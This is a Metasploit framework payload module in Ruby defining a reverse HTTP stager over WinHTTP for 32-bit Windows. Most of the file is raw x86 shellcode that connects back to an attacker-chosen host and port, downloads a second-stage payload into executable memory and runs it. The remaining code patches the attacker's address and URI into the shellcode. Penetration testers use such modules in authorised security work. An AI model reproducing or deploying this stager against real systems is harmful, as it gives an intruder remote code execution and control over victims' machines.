##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_http'


module Metasploit3

  CachedSize = 347

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  def self.handler_type_alias
    "reverse_winhttp"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse HTTP Stager (WinHTTP)',
      'Description'   => 'Tunnel communication over HTTP',
      'Author'        =>
        [
          'hdm',       # original stager
          'Borja Merino <bmerinofe[at]gmail.com>' # Adaptation from the hdm stager (based on WinINet) to WinHTTP
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseHttp,
      'Convention'    => 'sockedi http',
      'Stager'        =>
        {
          'Offsets' =>
            {
              # Disabled since it MUST be ExitProcess to work on WoW64 unless we add EXITFUNK support (too big right now)
              # 'EXITFUNC' => [ 244, 'V' ],
              'LPORT'    => [ 174, 'v' ] # Not a typo, really little endian
            },
          'Payload' =>
            # Size 323 (lhost not included)
            "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b" +
            "\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c" +
            "\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52" +
            "\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20" +
            "\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac" +
            "\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75" +
            "\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3" +
            "\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff" +
            "\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x74\x74\x70\x00\x68\x77" +
            "\x69\x6e\x68\x54\x68\x4c\x77\x26\x07\xff\xd5\x6a\x06\x5f\x31\xdb" +
            "\x89\xf9\x53\xe2\xfd\x68\x04\x1f\x9d\xbb\xff\xd5\x53\x68\x5c\x11" +
            "\x00\x00\xe8\x86\x00\x00\x00\x2f\x00\x31\x00\x32\x00\x33\x00\x34" +
            "\x00\x35\x00\x00\x00\x50\x68\x46\x9b\x1e\xc2\xff\xd5\x68\x00\x01" +
            "\x00\x00\x53\x53\x53\x57\x53\x50\x68\x98\x10\xb3\x5b\xff\xd5\x96" +
            "\x53\x53\x53\x53\x56\x68\x95\x58\xbb\x91\xff\xd5\x85\xc0\x75\x0a" +
            "\x4f\x75\xed\x68\xf0\xb5\xa2\x56\xff\xd5\x53\x56\x68\x05\x88\x9d" +
            "\x70\xff\xd5\x85\xc0\x74\xec\x6a\x40\x68\x00\x10\x00\x00\x68\x00" +
            "\x00\x40\x00\x53\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7" +
            "\x57\x68\x00\x20\x00\x00\x53\x56\x68\x6c\x29\x24\x7e\xff\xd5\x85" +
            "\xc0\x74\xc0\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\x5f\xe8\x82" +
            "\xff\xff\xff"
        }
      ))
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTPS
  #
  def stage_over_connection?
    false
  end

  #
  # Generate the first stage
  #
  def generate
    p = super
    # URI search in wide char (16 bits)
    i = p.index(Rex::Text.to_unicode("/12345") + "\x00")
    u = Rex::Text.to_unicode("/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW)) + "\x00"
    p[i, u.length] = u

    lhost = datastore['LHOST'] || Rex::Socket.source_address
    if Rex::Socket.is_ipv6?(lhost)
      lhost = "[#{lhost}]"
    end

   # Host needs to be in wide char (16 bits)
   p + Rex::Text.to_unicode(lhost + "\x00")
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end
end
